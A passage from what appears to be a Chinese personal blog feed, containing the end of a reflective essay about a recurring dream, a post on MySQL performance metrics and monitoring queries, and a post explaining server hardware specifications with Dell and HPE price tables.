<p>在身心俱疲的时候我常常会做那个梦，梦里我陪着爷爷走很长的夜路回家，月光把砂土的路面映得雪白，但落入草丛田野的光线就像沉入了水中一样，映不出一丝色彩，目力所及之处只有白练般的蜿蜒小路以及村庄的星点微光，远远地一瞅，便知哪一处灯火是自己的家。小小的窗户透出的昏黄灯光，远远地，黯淡得像六芒星一般，却暖得有如春日。但是我从我记事起就没见过我爷爷，也不知道怎么会出现这种古怪的梦境。</p>
<p>我想到了一个极恰当又很不合适的词来形容这个梦境——“魂归故里”（大雾）。可能正如喻世明言第十六卷《范巨卿鸡黍死生交》中说魂魄能日行千里 ，许是灵魂想家了，便代我走了这么一遭吧。 </p>
<p>说到灵魂这么玄乎的东西，我想起了以前看得的一个很有趣的文章——在必要的社交活动之外，我们还应当抽出适当的时间来陪陪自己的灵魂。文中提到 ，现如今的很多人都不太会与自己相处了，变得像是外向孤独症患者一般，人前乐观开朗，风趣健谈，独处时又变得焦躁，忧郁，总觉得心事无处诉说。 这时，你可能要想一想，自己有多久没有和自己聊聊了，世上最懂你的还是你自己，学会享受独处才是消灭孤独的唯一法门。（但是即使这样，好像还是没有什么用） </p>
<p>关于这点，我需要反思一下，我也很久没有写过像样点的文字了。这是我与自己交流的一种方式，我在写着，我也在看着。在闲暇的晚上，我偶尔去操场的看台上坐上一两个小时，戴上耳机，打开便签，看光标来来回回，文段变长变短，最后归于空白，但经此之后，内心却清明了许多。 </p>
<p>世上所有的水都是相连的，我认为所有的路也都是相连的，只是在这路上流淌的是人群罢了。脚下的路面与那条田间小径也有着同样的脉搏，也许这一生 只要一直不停地走下去，就能穿过钢筋水泥的丛林，看到那扇不灭的灯窗。 </p>
<p>梦的最后，我叩响了门环。</p>
<p>“谁啊？” </p>
<p>“我” </p>
<p>“来了” </p>
<p>门栓一阵响动之后，厚重的木门发出长长的呻吟，年少的我从门缝中探出身来。</p>
<p>PS：又到了该思考人生的深夜了（笑），今天也是积极向丧的一天呢，可能是因为入夜了，也可能是因为西瓜的《狂野想乡》勾起了回忆，更有可能是因为自己独自走在回校的路上，闲的蛋疼。。。。回来时明明才八点半，却像走在深夜十一点的城市中一样[肯定是因为手机没电关机了才产生的错觉，才不是因为学校位置太偏！（笑） ]。 </p>
]]></content>
      <categories>
        <category>生活</category>
      </categories>
      <tags>
        <tag>生活</tag>
      </tags>
  </entry>
  <entry>
    <title>性能指标</title>
    <url>/2018/12/02/%E6%80%A7%E8%83%BD%E6%8C%87%E6%A0%87/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h3 id="1、CPU、内存使用率、磁盘占用空间"><a href="#1、CPU、内存使用率、磁盘占用空间" class="headerlink" title="1、CPU、内存使用率、磁盘占用空间"></a>1、CPU、内存使用率、磁盘占用空间</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">CPU、内存、磁盘这三项是我们能够看到的最直观的指标，也是MySql运行状态的整体体现，一旦我们的数据库服务器这三项出现不正常的波动，必然会影响项目的稳定与性能，从而就需要我们对项目与MySql进行合理配置与优化。</span><br></pre></td></tr></table></figure>

<h3 id="2-、创建的连接数、连接的连接数、连接缓存数、连接活跃数"><a href="#2-、创建的连接数、连接的连接数、连接缓存数、连接活跃数" class="headerlink" title="2 、创建的连接数、连接的连接数、连接缓存数、连接活跃数"></a>2 、创建的连接数、连接的连接数、连接缓存数、连接活跃数</h3><ul>
<li>Threads_created：</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">通过show global status like &quot;Threads_created&quot;可以查看已经创建的连接数，这个顾名思义就是MySql已经创建的总连接数；</span><br></pre></td></tr></table></figure>

<ul>
<li>Threads_connectd：</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">通过show global status like &quot;Threads_connectd&quot;可以查看已经连接的连接数，这个值等于show processlist;</span><br></pre></td></tr></table></figure>

<ul>
<li>Threads_catched：</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">通过show global status like &quot;Threads_catched&quot;可以查看当前MySql当前缓存的连接数，我们知道MySql建立连接非常消耗资源，当已有连接不再使用之后，MySql不会直接断开连接，而是将连接缓存到缓存池中，以便下次在有create thread的需求时，从而达到复用连接，提高性能的目标，所以Threads_catched中的值就是当前缓存池中可用连接数量，由此我们可以得出 Threads_created的值应该是Threads_connectd与Threads_catched之和， 当然如果已经有了中间件或者其他的连接池管理，那么这个参数就没有那么重要了，但是如果没有其他的连接池管理，那么优化这个参数还是有一定必要的。</span><br></pre></td></tr></table></figure>

<ul>
<li>Threads_running：</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">通过show global status like &quot;Threads_running&quot;可以查看当前活跃的连接数，这个值代表处于当前激活状态的连接线程个数，这个值必定是小于Threads_connectd的。</span><br></pre></td></tr></table></figure>

<h3 id="3、IOPS、QPS、TPS"><a href="#3、IOPS、QPS、TPS" class="headerlink" title="3、IOPS、QPS、TPS"></a>3、IOPS、QPS、TPS</h3><ul>
<li>IOPS：(Input/Output operations Per Second,既每秒处理I/O的请求次数)</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">我们知道数据库的处理本质上是IO的读写处理，你可以简单的把IOPS理解为存储介质（一般是磁盘）在单位时间内能处理的IO读写请求数量，因为所有对MySql数据库的访问与操作最后都会落在对磁盘的读写上，那么IOPS的数值越高自然在一定时间内能接受的数据库处理请求就越多，IOPS的计算公式：IOPS&#x3D;1000ms&#x2F;(寻道时间+旋转延迟时间)，可以看到这个指标的计算跟你存储介质的性能是息息相关的，所以把普通机械硬盘替换为SSD固态硬盘是提高MySql处理能力的一种比较有效的手段。</span><br></pre></td></tr></table></figure>

<ul>
<li>QPS(Query Per Second,既每秒请求查询次数)</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">QPS是MySql数据库的一个十分重要指标，它代表MySql数据库每秒接收的请求查询次数，我们可以通过show global status like &quot;Questions&quot; 来查看数据库当前的Questions也就是查询请求的次数，但要注意的是这个值是一个全局的累计值，也就是自MySql服务启动后所有查询次数。如果我们计算的是数据库服务QPS性能的一个均值，可以直接采用下面的计算方式：</span><br><span class="line">questions &#x3D; show global status like &quot;questions&quot;; -- MySql启动后查询请求的总数量</span><br><span class="line">uptimes &#x3D; show global status like &quot;uptime&quot;; -- MySql本次启动后的运行时间(单位：秒)</span><br><span class="line">QPS &#x3D; questions&#x2F;uptimes</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">如果你要计算的是系统峰值时QPS指标，这就需要我们手动去计算了，我们可以相隔单位时间通过show global status like &quot;Questions&quot;命令查询下这个值,并将相邻的两值相减除以相隔的时间,得到的就是精确的每一秒的实际请求数了。</span><br></pre></td></tr></table></figure>

<ul>
<li>TPS(Transcantion Per Second,既每秒事务数)</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">既然是每秒事务数据，在InnoDB引擎下才会有这个指标数据，TPS涉及到事务的提交与回滚，所以计算TPS时需要把show global status like &quot;Com_commit&quot; 与 show global status like &quot;Com_rollback&quot;，计算方法同样需要我们每间隔一段时间进行一次采样，然后把Com_commit与Com_rollback值相加除以单位时间就是TPS值了，公式如下：</span><br><span class="line">commit &#x3D; show global status like &quot;Com_commit&quot;;</span><br><span class="line">rollback &#x3D;  show global status like &quot;Com_rollback&quot;;</span><br><span class="line">TPS&#x3D; (commit+rollback)&#x2F;seconds(单位时间，单位：秒)</span><br></pre></td></tr></table></figure>

<ul>
<li><p>BPS bit per second  位每秒</p>
<h3 id="4、InnoDB缓存读命中率、使用率、脏块率（-）"><a href="#4、InnoDB缓存读命中率、使用率、脏块率（-）" class="headerlink" title="4、InnoDB缓存读命中率、使用率、脏块率（%）"></a>4、InnoDB缓存读命中率、使用率、脏块率（%）</h3></li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">在MySql的使用中，由于InnoDB引擎的优点与特性，我们一般都会选择其做为MySql的数据引擎，InnoDB拥有的缓存特性可以很大程度的提高MySql的查询性能，因为Innodb 不仅仅缓存索引，同时还会缓存实 际的数据，通过配置我们可以在Innodb 存储引擎中使用更多的内存来缓存数据，那么在这个过程中其缓存的命中率、使用率与脏块率必然是重要的性能指标。</span><br><span class="line">关于Innodb有很多参数指标：</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F;innodb文件读写次数</span><br><span class="line">innodb_data_reads：innodb平均每秒从文件中读取的次数</span><br><span class="line">innodb_data_writes：innodb平均每秒从文件中写入的次数</span><br><span class="line">innodb_data_fsyncs：innodb平均每秒进行fsync()操作的次数</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F;innodb读写量</span><br><span class="line">innodb_data_read：innodb平均每秒钟读取的数据量，单位为KB</span><br><span class="line">innodb_data_written：innodb平均每秒钟写入的数据量，单位为KB</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F;innodb缓冲池状态</span><br><span class="line">innodb_buffer_pool_reads: 平均每秒从物理磁盘读取页的次数 </span><br><span class="line">innodb_buffer_pool_read_requests: 平均每秒从innodb缓冲池的读次数（逻辑读请求数）</span><br><span class="line">innodb_buffer_pool_write_requests: 平均每秒向innodb缓冲池的写次数</span><br><span class="line">innodb_buffer_pool_pages_dirty: 平均每秒innodb缓存池中脏页的数目</span><br><span class="line">innodb_buffer_pool_pages_flushed: 平均每秒innodb缓存池中刷新页请求的数目</span><br><span class="line"></span><br><span class="line">而InnoDB缓存读命中率、使用率、脏块率（%）主要就是根据上面参数计算出来的</span><br><span class="line">innodb缓冲池的读命中率 &#x3D; ( 1 - Innodb_buffer_pool_reads&#x2F;Innodb_buffer_pool_read_requests) * 100</span><br><span class="line">Innodb缓冲池的利用率 &#x3D;  ( 1 - Innodb_buffer_pool_pages_free &#x2F; Innodb_buffer_pool_pages_total) * 100</span><br><span class="line">Innodb缓冲池的脏块的百分率 &#x3D; (innodb_buffer_pool_pages_dirty &#x2F; innodb_buffer_pool_pages_total) * 100</span><br><span class="line"></span><br><span class="line">innodb  支持行级锁 支持事务        更适用于频繁的读写</span><br><span class="line">myisam  支持表级锁 存储数据量更大   更适用于大量读的业务</span><br></pre></td></tr></table></figure>



<h3 id="5-网络流量（平均每秒的输入输出量）"><a href="#5-网络流量（平均每秒的输入输出量）" class="headerlink" title="5. 网络流量（平均每秒的输入输出量）"></a>5. 网络流量（平均每秒的输入输出量）</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">MySql数据的网络流量监控可通过计算单位时间内Bytes_received与Bytes_sent获取。</span><br><span class="line">Bytes_received&#x2F;s：平均每秒从所有客户端接收到的字节数，单位KB</span><br><span class="line">Bytes_sent&#x2F;s：平均每秒发送给所有客户端的字节数，单位KB</span><br></pre></td></tr></table></figure>

<h3 id="6、MySql中InnoDB引擎每秒钟查询次数、插入次数、删除次数、更新次数的统计"><a href="#6、MySql中InnoDB引擎每秒钟查询次数、插入次数、删除次数、更新次数的统计" class="headerlink" title="6、MySql中InnoDB引擎每秒钟查询次数、插入次数、删除次数、更新次数的统计"></a>6、MySql中InnoDB引擎每秒钟查询次数、插入次数、删除次数、更新次数的统计</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">MySql数据库全局的查询、插入、删除、更新次数可通过show  global status like &quot;%innodb_rows%&quot;命令来查看，而计算单位时间内的上述各项指标即可获取InnoDB引擎每秒钟查询次数、插入次数、删除次数、更新次数</span><br><span class="line"></span><br><span class="line">InnoDB引擎每秒钟查询次数 &#x3D; Innodb_rows_read&#x2F;s</span><br><span class="line">InnoDB引擎每秒钟插入次数 &#x3D; Innodb_rows_inserted&#x2F;s</span><br><span class="line">InnoDB引擎每秒钟删除次数 &#x3D; Innodb_rows_deleted&#x2F;s</span><br><span class="line">InnoDB引擎每秒钟删除次数 &#x3D; Innodb_rows_updated&#x2F;s</span><br></pre></td></tr></table></figure>



]]></content>
      <categories>
        <category>性能指标</category>
      </categories>
      <tags>
        <tag>性能指标</tag>
      </tags>
  </entry>
  <entry>
    <title>戴尔惠普服务器配置及价格</title>
    <url>/2019/03/12/%E6%88%B4%E5%B0%94%E6%83%A0%E6%99%AE%E6%9C%8D%E5%8A%A1%E5%99%A8%E9%85%8D%E7%BD%AE%E5%8F%8A%E4%BB%B7%E6%A0%BC/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">POP3是Post Office Protocol 3的简称，即邮局协议的第3个版本,规定怎样将个人计算机连接到Internet的邮件服务器和下载电子邮件的电子协议。POP3允许用户从服务器上把邮件存储到本地主机（即自己的计算机）上,同时删除保存在邮件服务器上的邮件，而POP3服务器则是遵循POP3协议的接收邮件服务器，用来接收电子邮件的。</span><br><span class="line"></span><br><span class="line">SMTP 的全称是“Simple Mail Transfer Protocol”，即简单邮件传输协议。是一组用于从源地址到目的地址传输邮件的规范，通过来控制邮件的中转方式。SMTP 协议属于 TCP&#x2F;IP 协议簇，帮助每台计算机在发送或中转信件时找到下一个目的地。SMTP 服务器就是遵循 SMTP 协议的发送邮件服务器。</span><br><span class="line">SMTP 认证，简单地说就是要求必须在提供了账户名和密码之后才可以登录 SMTP 服务器，这就使得那些垃圾邮件的散播者无可乘之机。</span><br><span class="line"></span><br><span class="line">IMAP全称是Internet Mail Access Protocol，即交互式邮件存取协议，是跟POP3类似邮件访问标准协议之一。不同的是，开启了IMAP后，电子邮件客户端收取的邮件仍然保留在服务器上，同时在客户端上的操作都会反馈到服务器上，如：删除邮件，标记已读等，服务器上的邮件也会做相应的动作。所以无论从浏览器登录邮箱或者客户端软件登录邮箱，看到的bai邮件以及状态都是一致的。</span><br></pre></td></tr></table></figure>

<h1 id="1、服务器基本配置说明"><a href="#1、服务器基本配置说明" class="headerlink" title="1、服务器基本配置说明"></a>1、服务器基本配置说明</h1><h2 id="内存"><a href="#内存" class="headerlink" title="内存"></a>内存</h2><p>例：8GB 1000MT/s DDR4 ECC UDIMM (x1)<br>1000MT/s 就是：每秒1000兆次数据传输,反映单位时间内的传输速率。</p>
<p>DDR4内存：是新一代的内存规格；DDR4相比DDR3最大的区别有三点：16bit预取机制（DDR3为8bit），同样内核频率下理论速度是DDR3的两倍；更可靠的传输规范，数据可靠性进一步提升；工作电压降为1.2V，更节能。</p>
<p>ECC内存，即应用了能够实现错误检查和纠正技术（ECC）的内存条，可以降低因为内存错误导致的死机</p>
<p>目前使用的内存条类型(DIMM)主要有三种：UDIMM、RDIMM和LRDIMM</p>
<p>UDIMM是控制器直接访问内存颗粒，RDIMM是先访问寄存器（r就是register的意思），这里我们可以看出，是否能用RDIMM，取决于内存控制器是否具备控制寄存器的能力，而且由于内存控制器访问寄存器。LRDIMM：全称Load Reduced DIMM，低负载双列直插内存模块。相比RDIMM，LRDIMM并未使用复杂寄存器，只是简单缓冲，缓冲降低了下层主板上的电力负载，但对内存性能几乎无影响。</p>
<p>UDIMM由于并未使用寄存器，无需缓冲，同等频率下延迟较小。此外，UDIMM的另一优点在于价格低廉。其缺点在于容量和频率较低。此外，由于UDIMM只能在Unbuffered 模式工作，不支持服务器内存满配(最大容量)，无法最大程度发挥服务器性能</p>
<p>RDIMM支持Buffered模式和高性能的Registered模式，较UDIMM更为稳定，同时支持服务器内存容量最高容量。缺点在于由于寄存器的使用，其延迟较高，同时加大了能耗，此外，价格也比UDIMM昂贵</p>
<p>LRDIMM可以说是RDIMM的替代品，其一方面降低了内存总线的负载和功耗，另一方面又提供了内存的最大支持容量，虽然其最高频率和RDIMM一样，均为3200 MT/s，但在容量上提高到64GB。并且，相比RDIMM，Dual-Rank LRDIMM内存功耗只有其50%。LRDIMM也同样运于服务器领域，但其价格，较RDIMM也更贵些。</p>
<h2 id="CPU"><a href="#CPU" class="headerlink" title="CPU"></a>CPU</h2><p>例:英特尔® 至强® E-2224 3.4GHz, 8M 缓存, 4C/4T, turbo (71W)<br>版本：至强® E-2224；   处理器速度：3.4GHz； 4C/4T：四核四线程；<br>turbo：涡轮增压，它允许关闭一些核心，而将电力加至其它核心，让他们以更高的频率运行，整个CPU的TDP仍保持不变</p>
<h2 id="RAID"><a href="#RAID" class="headerlink" title="RAID"></a>RAID</h2><p>RAID的意思是廉价磁盘冗余阵列（Redundant Array of Inexpensive Disks），但现在它被称为独立磁盘冗余阵列（Redundant Array of Independent Drives）<br>RAID 0：至少需要1块盘，安全性低。<br>RAID 1：至少需要2块盘，并且盘数要是偶数，一个磁盘上的数据被完全复制到另外一块磁盘上，I/O读写速度不快，有冗余，磁盘空间减少一半，安全性高。<br>RAID 5：至少需要3块盘，所有盘中有一块盘作为奇偶校验盘，当有一块盘坏掉的时候，其他的盘与奇偶校验盘就可以恢复出坏掉的那块盘的数据，读写速度快，安全性高。对于需要大容量并且具有一定安全性的需求来说，RAID 5是很适合的。<br>RAID 10：至少需要4快盘，并且盘数是偶数盘，将磁盘分为2大组作为RAID 0,每一小组中做RAID 1,磁盘空间会浪费一半</p>
<h2 id="几路服务器"><a href="#几路服务器" class="headerlink" title="几路服务器"></a>几路服务器</h2><p>单路服务器指只能上一颗处理器，双路服务器指能上两颗处理器<br>intel平台，单路服务器用的内存可以是ECC,非ECC。双路服务器用的内存只能是FB-DIMM ECC。<br>AMD平台，单路服务器可以上ecc,非ECC,REG ECC，双路服务器只能上REG ECC</p>
<h2 id="几U"><a href="#几U" class="headerlink" title="几U"></a>几U</h2><p>1U 2U 指的是服务器高度<br>U是一种表示服务器外部尺寸的单位，是unit的缩略语，详细的尺寸由作为业界团体的美国电子工业协会（EIA）所决定。<br>之所以要规定服务器的尺寸，是为了使服务器保持适当的尺寸以便放在铁质或铝质的机架上。机架上有固定服务器的螺孔，以便它能与服务器的螺孔对上号，再用螺丝加以固定好，以方便安装每一部服务器所需要的空间。<br>规定的尺寸是服务器的宽（48.26cm＝19英寸）与高（4.445cm的倍数）。由于宽为19英寸，所以有时也将满足这一规定的机架称为“19英寸机架”。厚度以4.445cm为基本单位。1U就是4.445cm，2U则是1U的2倍为8.89cm。<br>所谓“1U的PC服务器”，就是外形满足EIA规格、厚度为4.445cm的产品。设计为能放置到19英寸机柜的产品一般被称为机架服务器。</p>
<h2 id="硬盘参数"><a href="#硬盘参数" class="headerlink" title="硬盘参数"></a>硬盘参数</h2><p>例 1TB 7.2K RPM SATA 6Gbps 512n 3.5英寸热插拔硬盘 (x1)<br>容量：1TB；  7.2K RPM：转速，7200 rpm（转每分Revolutions Per minute）；  接口：SATA 6GB/s </p>
<p>512n:<br>在过去很长的一段时间中，硬盘的单位扇区格式是512字节，但是这部分空间无法全部用来存储数据，因为还有用于ECC校验、地址标记等代码，这些功能性代码约占用了65字节，因此单位扇区格式为512字节的磁盘真正用于存储的空间利用率不到90%。<br>随着磁盘技术的发展，为了提高磁盘容量，生产厂商开发出了名为“先进格式化磁盘“(Advanced Format)的技术，该技术将磁盘的单位扇区改为4K，这相当8个512字节格式的整合,而且这8个512字节扇区共用一套功能性代码，因此整体的存储效率得到了大大的提高。4K磁盘的储存空间利用率，能达到97%以上。<br>为了帮助这些旧式操作系统都能过渡到单位扇区大小为4K的先进格式，硬盘厂发布了512e格式的硬盘，即单位扇区大小为4K的硬盘，但它具有一个模拟的功能，能将4K的硬盘模拟成512字节的逻辑扇区，以此来支持更多不同的旧系统与旧应用程序。</p>
<p>规格：3.5英寸<br>热插拔 （Hot Swap） 即带电插拔，指的是在不关闭系统电源的情况下，将模块、板卡插入或拔出系统而不影响系统的正常工作，从而提高了系统的可靠性、快速维修性、冗余性和对灾难的及时恢复能力等。</p>
<h2 id="DELL服务器"><a href="#DELL服务器" class="headerlink" title="DELL服务器"></a>DELL服务器</h2><p>以Dell服务器R720型号为例</p>
<p>R = 机架式服务器 （T=塔式服务器，M=刀片式服务器）</p>
<p>7 = CPU的颗数 1-3是单路，4-7是双路，8亦双亦四 ，9是四路 。</p>
<p>说明：服务器CPU的单位为路，单路=1颗CPU</p>
<p>2 = 代数（第二代） 0表示第十代，后面以此类推。</p>
<p>0 = CPU的品牌 （0是Intel，5是AMD）<br>————————————————</p>
<p><strong>单路机架式服务器：</strong></p>
<table>
<thead>
<tr>
<th></th>
<th>价格</th>
<th>内存</th>
<th>CPU</th>
<th>RAID</th>
<th>硬盘</th>
</tr>
</thead>
<tbody><tr>
<td>PowerEdge R340 服务器(1U)</td>
<td>7999起</td>
<td>8GB 2666MT/s DDR4 ECC UDIMM (x1)</td>
<td>英特尔® 至强® E-2224 3.4GHz, 8M 缓存, 4C/4T, turbo (71W)</td>
<td>C20, 无RAID 含嵌入式SATA适用于SATA HDDs或SATA SSDs (允许混合驱动器类型)</td>
<td>1TB 7.2K RPM SATA 6Gbps 512n 3.5英寸热插拔硬盘 (x1)</td>
</tr>
<tr>
<td>PowerEdge R240 服务器(1U)</td>
<td>6599起</td>
<td>8GB 2666MT/s DDR4 ECC UDIMM (x1)</td>
<td>英特尔® 赛扬 G4930 3.2GHz, 2M 缓存, 2C/2T, 无 turbo (54W)</td>
<td>C20, 无RAID 含嵌入式SATA适用于SATA HDDs或SATA SSDs (允许混合驱动器类型)</td>
<td>1TB 7.2K RPM SATA 6Gbps 512n 3.5英寸 有线硬盘 (x1)</td>
</tr>
<tr>
<td>PowerEdge R7515 服务器(2U)</td>
<td>46999起</td>
<td>32GB RDIMM, 3200MT/s, 双列 (x4)</td>
<td>AMD EPYC 7402P 2.80GHz, 24C/48T, 128M 缓存 (180W) DDR4-3200</td>
<td>C6, RAID 1 + RAID 5适用于HDDs或SSDs (类型/速度/容量匹配 无各RAID容器)</td>
<td>480GB SSD SATA 读取密集型 6Gbps 512 2.5英寸热插拔 AG 硬盘,3.5英寸HYB 托架, 1 DWPD, 876 TBW (x2)+4T热插拔SATA (x4)</td>
</tr>
<tr>
<td>PowerEdge R6515 服务器(1U)</td>
<td>131637起</td>
<td>8GB RDIMM, 3200MT/s, 单列 (x8)</td>
<td>AMD EPYC 7502P 2.5GHz, 32C/64T, 128M 缓存 (180W) DDR4-3200</td>
<td>C7, 未配置RAID适用于HDDs或SSDs (允许混合驱动程序类型)</td>
<td>480GB SSD SATA 读取密集型 6Gbps 512 2.5英寸热插拔 AG 硬盘, 1 DWPD, 876 TBW (x1)</td>
</tr>
</tbody></table>
<p><strong>双路机架式服务器：</strong></p>
<p>1）<strong>PowerEdge R540 机架式服务器</strong></p>
<p>简介：凭借在资源与经济性之间实现出色平衡的双路 2U 机架式服务器，满足各种应用程序需求。</p>
<p>至强银牌 4210/16GB/2TB:15899起；  至强银牌 4208/8GB/480GB:15699起；至强银牌 4214/16GB/2TB:16999起</p>
<p>2）<strong>PowerEdge R740 机架式服务器</strong></p>
<p>简介：在专门针对VDI优化的2U双路平台中提供加速器卡、存储和计算能力的卓越组合，更大限度地提高应用程序性能。</p>
<p>参考价格：至强银牌 4210<strong><strong><em>2/16GB</em></strong></strong>2/4TB<em>2:24999起；至强银牌 4210R****</em>2/32GB<strong><strong><em>4/8TB</em></strong></strong>6:75412起；</p>
<p>至强银牌 4214<strong><strong><em>2/16GB</em></strong></strong>4/4TB<strong><strong><em>4:33771起；至强银牌 4216</em></strong></strong>2/32GB****<em>2/4TB</em>2:40999起；</p>
<p>至强银牌 4216<strong><strong><em>2/32GB</em></strong></strong>8/1.8TB<em>4:448416起；至强银牌 4216****</em>2/32GB****<em>2/480GB</em>2:46416起；</p>
<p>至强银牌 5218<strong><strong><em>2/32GB</em></strong></strong>4/2.4TB<em>4:61321起；至强银牌 6230****</em>2/32GB<strong><strong><em>4/4TB</em></strong></strong>6:59999起；</p>
<table>
<thead>
<tr>
<th></th>
<th>价格</th>
<th>内存</th>
<th>CPU</th>
<th>RAID</th>
<th>硬盘</th>
</tr>
</thead>
<tbody><tr>
<td>PowerEdge R540 服务器（2U）</td>
<td>13699起</td>
<td>8GB RDIMM, 2666MT/s, 单列 (x1)</td>
<td>英特尔至强银牌 4208 2.1G, 8C/16T, 9.6GT/s, 11M 缓存, Turbo, HT (85W) DDR4-2400</td>
<td>C20, 无RAID 含嵌入式SATA适用于SATA HDDs或SATA SSDs (允许混合驱动器类型)</td>
<td>480GB SSD SATA 混合使用 6Gbps 512 2.5英寸热插拔 AG 硬盘,3.5英寸 HYB 托架, 3 DWPD, 2628 TBW (x1)</td>
</tr>
<tr>
<td>PowerEdge R740 服务器</td>
<td>24999起</td>
<td>16GB RDIMM, 2933MT/s, 双列 (x2)</td>
<td>英特尔至强银牌 4210 2.2G, 10C/20T, 9.6GT/s, 13.75M 缓存, Turbo, HT (85W) DDR4-2400</td>
<td>C1, 无RAID适用于HDDs/SSDs (允许混合驱动器类型)</td>
<td>4TB 7.2K RPM SATA 6Gbps 512n 3.5英寸热插拔硬盘 (x2)</td>
</tr>
<tr>
<td>PowerEdge R740xd 服务器（2U）</td>
<td>45745起</td>
<td>8GB RDIMM, 2666MT/s, 单列 (x2)</td>
<td>英特尔至强铜牌 3204 1.9G, 6C/6T, 9.6GT/s, 8.25M 缓存, 无 Turbo, 无 HT (85W) DDR4-2133</td>
<td>C4, RAID 5适用于3或更多HDDs或SSDs (类型/速度/容量匹配)</td>
<td>2TB 7.2K RPM NLSAS 12Gbps 512n 3.5英寸热插拔硬盘 (x8)</td>
</tr>
<tr>
<td>PowerEdge R440 服务器（1U）</td>
<td>11899起</td>
<td>8GB RDIMM, 2666MT/s, 单列 (x1)</td>
<td>英特尔至强铜牌 3204 1.9G, 6C/6T, 9.6GT/s, 8.25M 缓存, 无 Turbo, 无 HT (85W) DDR4-2133</td>
<td>C20, 无RAID 含嵌入式SATA适用于SATA HDDs或SATA SSDs (允许混合驱动器类型)</td>
<td>1TB 7.2K RPM SATA 6Gbps 512n 3.5英寸热插拔硬盘 (x1)</td>
</tr>
<tr>
<td>PowerEdge R640 服务器（1U）</td>
<td>35999起</td>
<td>32GB RDIMM, 2933MT/s, 双列 (x2)</td>
<td>英特尔至强银牌 4216 2.1G, 16C/32T, 9.6GT/s, 22M 缓存, Turbo, HT (100W) DDR4-2400</td>
<td>C1, 无RAID适用于HDDs/SSDs (允许混合驱动器类型)</td>
<td>4TB 7.2K RPM NLSAS 12Gbps 512n 3.5英寸热插拔硬盘 (x3)</td>
</tr>
<tr>
<td>PowerEdge R6525 服务器</td>
<td>173920起</td>
<td>32GB RDIMM, 3200MT/s, 双列 (x16)</td>
<td>AMD EPYC 7302 3GHz, 16C/32T, 128M 缓存 (155W) DDR4-3200</td>
<td>C1, 无RAID适用于HDDs/SSDs (允许混合驱动程序类型)</td>
<td>480GB SSD SATA 混合使用 6Gbps 512 2.5英寸热插拔 AG 硬盘,3.5英寸 HYB 托架, 3 DWPD, 2628 TBW (x1)</td>
</tr>
</tbody></table>
<p><strong>四路机架式服务器</strong></p>
<table>
<thead>
<tr>
<th></th>
<th>价格</th>
<th>内存</th>
<th>CPU</th>
<th>RAID</th>
<th>硬盘</th>
</tr>
</thead>
<tbody><tr>
<td>PowerEdge R940xa</td>
<td></td>
<td>多达4个双宽GPU或多达8个全高FPGA</td>
<td>多达 4 个第二代英特尔®至强®可扩展处理器 ，每个处理器高达 28 个核心</td>
<td>软件RAID：S140；外部PERC（RAID）：H840</td>
<td>多达8个2.5” SAS SATA（硬盘/固态硬盘），容量高达30 TB；或多达24个2.5” SAS/SATA（硬盘/固态硬盘），容量高达92 TB；或多达32个SAS/SATA（硬盘/固态硬盘），可配多达4个NVME PCIe固态硬盘，容量高达132 TB</td>
</tr>
<tr>
<td>PowerEdge R940</td>
<td></td>
<td>48个DDR4 DIMM插槽，支持RDIMM/LRDIMM，速度高达2666 MT/s，最高6 TB ；多达12个NVDIMM，最高384 GB；仅支持寄存式ECC DDR4 DIMM</td>
<td>多达四个英特尔®至强®可扩展处理器，多达28个核心</td>
<td>外部HBA（RAID）：H840</td>
<td>最高可配24个2.5”硬盘（多达12个NVMe） ；最大存储容量122 TB</td>
</tr>
</tbody></table>
<h2 id="惠普服务器"><a href="#惠普服务器" class="headerlink" title="惠普服务器"></a>惠普服务器</h2><p><a href="http://www.itsto.com/" target="_blank" rel="noopener">http://www.itsto.com/</a></p>
<p>HPE DL20 Gen10 服务器系列-1U单路</p>
<p>HPE ProLiant DL20 Gen10 服务器兼具出色的性能、可靠性和可管理性。这款 1P1U 服务器搭载英特尔奔腾、酷睿 i3 或至强 E 处理器，具备多项特有的企业级功能，而且价格经济实惠，是成长型企业和服务供应商理想的机架式服务器平台。出色的配置灵活性能够满足各种业务需求，同时多种 HPE 认证选件可满足大部分需求，帮助客户有效的改善其工作效率</p>
<table>
<thead>
<tr>
<th></th>
<th>价格</th>
<th>内存</th>
<th>cpu</th>
<th>RAID</th>
<th>硬盘</th>
</tr>
</thead>
<tbody><tr>
<td>G5420 2LFF标配</td>
<td>6000</td>
<td>8GB（1x8GB UDIMM，2666MHZ）非缓冲区，最大支持4个DDR4内存插槽</td>
<td>一个Intel Pentium G5420（3.8GHz/2-core/54W）,最大支持1个处理器</td>
<td>1个<a href="http://www.itsto.com/" target="_blank" rel="noopener">惠普</a>/HPE嵌入式 S100i SATA阵列控制器,支持RAID 0/1/5/10</td>
<td>2个冷插拔，最大2个3.5英寸硬盘槽位，标配无硬盘</td>
</tr>
<tr>
<td>E-2124 2LFF 标配</td>
<td>6600</td>
<td>标配8GB (1x8GB UDIMM, 2666 MHz)非缓冲内存, 最大支持4个DDR4内存插槽</td>
<td>标配1个Intel Xeon E-2124 (3.3GHz/4-core/71W), 可支持最大1个处理器</td>
